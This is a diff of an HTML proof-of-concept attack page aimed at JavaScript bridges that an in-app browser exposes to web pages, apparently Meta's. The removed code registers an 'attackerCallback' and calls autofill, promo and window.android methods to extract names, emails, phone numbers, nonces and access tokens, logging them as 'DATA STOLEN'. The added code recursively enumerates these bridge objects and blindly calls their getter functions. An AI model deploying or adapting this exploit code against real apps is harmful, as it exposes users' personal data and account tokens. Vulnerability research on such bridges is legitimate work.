@@ -28,113 +28,28 @@
     <div id="log">Waiting for action...<br></div>
 
     <script>
-        function log(msg) {
-            document.getElementById('log').innerHTML += msg + "<br>";
-        }
-
-        window.attackerCallback = function(data) {
-            log("<span style='color:red;'><b>🚨 DATA STOLEN:</b></span><br>" + JSON.stringify(data));
-            alert("Data extracted successfully!");
-        };
-
-        function attackAutofill() {
-            if (!window._AutofillExtensions) {
-                log("Error: _AutofillExtensions not found.");
-                return;
-            }
-        
+    function deepDump(obj, name, depth = 0) {
+        if (depth > 2) return;
+        let props = Object.getOwnPropertyNames(obj);
+        props.forEach(prop => {
             try {
-                const initPayload = JSON.stringify({
-                    callbackID: "attackerCallback",
-                    name: "attackerCallback"
-                });
-                window._AutofillExtensions.initializeCallbackHandler(initPayload);
-        
-                const requestPayload = JSON.stringify({
-                    callbackID: "attackerCallback",
-                    name: "attackerCallback",
-                    request_id: "1337",
-                    autofillFields: "NAME,EMAIL,PHONE",
-                    requested_fields: ["NAME", "EMAIL", "PHONE"]
-                });
-        
-                const methods = [
-                    "requestAutoFill",
-                    "autofillAppliedStatusesV2",
-                    "formSubmitted",
-                    "getNonce",
-                    "initializeCallbackHandler",
-                    "proactivePromptsContactAutofillData",
-                    "saveAutofillData",
-                    "selectedContactFieldTag"
-                ];
-        
-                for (const method of methods) {
-                    if (typeof window._AutofillExtensions[method] === "function") {
-                        window._AutofillExtensions[method](requestPayload);
-                    } else {
-                        log(`Warning: ${method} is not a function.`);
+                let val = obj[prop];
+                if (typeof val === 'function') {
+                    log("Found function: " + name + "." + prop);
+                    // Try to execute common getters blindly
+                    if (prop.startsWith('get') || prop.startsWith('is')) {
+                        let res = val.apply(obj);
+                        log("--> Result of " + prop + "(): " + JSON.stringify(res));
                     }
+                } else if (typeof val === 'object' && val !== null) {
+                    deepDump(val, name + "." + prop, depth + 1);
                 }
-        
-                log("requestAutoFill executed! Check for prompt.");
-            } catch (e) {
-                log("Execution Failed: " + e.message);
-            }
-        }
-        function attackPromo() {
-            if (!window._PromoExtensions) {
-                log("Error: _PromoExtensions not found.");
-                return;
-            }
-        
-            try {
-                const payload = JSON.stringify({ callbackID: "attackerCallback" });
-        
-                const methods = [
-                    "getPromoExtensionNonce",
-                    "initializePromoExtensionCallbackHandler",
-                    "requestPromoExtensionPromoCodeAutofill",
-                    "sendPromoExtensionPromoCodeAutofillResult"
-                ];
-        
-                let lastResult = null;
-        
-                for (const method of methods) {
-                    if (typeof window._PromoExtensions[method] === "function") {
-                        lastResult = window._PromoExtensions[method](payload);
-                    } else {
-                        log(`Warning: ${method} is not a function.`);
-                    }
-                }
-        
-                log("<span style='color:red;'><b>🚨 NONCE STOLEN:</b></span> " + lastResult);
-            } catch (e) {
-                log("Promo Failed: " + e.message);
-            }
-        }
-
-        function attackAndroid() {
-            if (!window.android) { log("Error: android object not found."); return; }
-            log("Blindly attacking window.android...");
-            
-            // Try to guess common Meta methods
-            const methods = ['getAccessToken', 'getToken', 'share', 'getDeviceID', 'getUserInfo'];
-            
-            methods.forEach(m => {
-                try {
-                    let res = window.android[m](); // Try without args
-                    log(`<b>${m}()</b> returned: ` + res);
-                } catch(e) {
-                    try {
-                        let res2 = window.android[m]('{}'); // Try with JSON arg
-                        log(`<b>${m}('{}')</b> returned: ` + res2);
-                    } catch(e2) {
-                        log(`- ${m} failed.`);
-                    }
-                }
-            });
-        }
-    </script>
+            } catch(e) {}
+        });
+    }
+    // Call this after 2 seconds
+    setTimeout(() => { deepDump(window._AutofillExtensions, "_AutofillExtensions"); }, 2000);
+    setTimeout(() => { deepDump(window.android, "android"); }, 2000);
+</script>
 </body>
 </html>
